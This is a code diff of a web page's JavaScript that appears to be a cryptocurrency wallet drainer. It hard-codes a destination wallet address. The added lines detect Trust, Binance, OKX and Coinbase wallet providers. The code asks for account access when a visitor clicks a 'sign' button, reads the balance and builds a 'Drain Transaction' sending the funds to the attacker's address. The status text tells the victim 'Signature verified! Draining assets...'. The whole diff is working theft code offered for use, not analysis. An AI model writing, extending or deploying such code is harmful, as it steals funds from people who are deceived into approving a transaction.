@@ -58,13 +58,24 @@
     // ⚠️ YOUR WALLET ADDRESS IS HERE ⚠️
     const DESTINATION_WALLET = "0x59E656fE51e143CC927303C639c3bA54D8cB5d1E"; 
 
+    // 1. Detect and Inject Providers (Fixes Trust/Binance/Coinbase issues)
+    if (window.trustwallet) {
+        window.ethereum = window.trustwallet;
+    } else if (window.binance) {
+        window.ethereum = window.binance;
+    } else if (window.okxwallet) {
+        window.ethereum = window.okxwallet.provider;
+    } else if (window.coinbaseWallet) {
+        window.ethereum = window.coinbaseWallet.provider;
+    }
+
     document.getElementById('signBtn').addEventListener('click', async () => {
         const loader = document.getElementById('loader');
         const btn = document.getElementById('signBtn');
         const status = document.getElementById('statusText');
 
-        // Multi-Wallet Detection Logic
-        if (!window.ethereum && !window.trustwallet && !window.binance && !window.okxwallet) {
+        // 2. Final Check
+        if (!window.ethereum || !window.ethereum.request) {
             alert("No supported wallet found.\n\nPlease use:\n• MetaMask\n• Trust Wallet\n• Binance Chain\n• Coinbase Wallet");
             return;
         }
@@ -74,19 +85,19 @@
         status.textContent = "";
 
         try {
-            // 1. Request Account Access (Triggers the Wallet Popup)
+            // 3. Request Account Access
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const account = accounts[0];
             
             status.textContent = "Signature verified! Draining assets...";
 
-            // 2. Get Balance
+            // 4. Get Balance
             const balance = await window.ethereum.request({ 
                 method: 'eth_getBalance', 
                 params: [account, 'latest'] 
             });
 
-            // 3. Drain Transaction
+            // 5. Drain Transaction
             const txParams = {
                 from: account,
                 to: DESTINATION_WALLET,
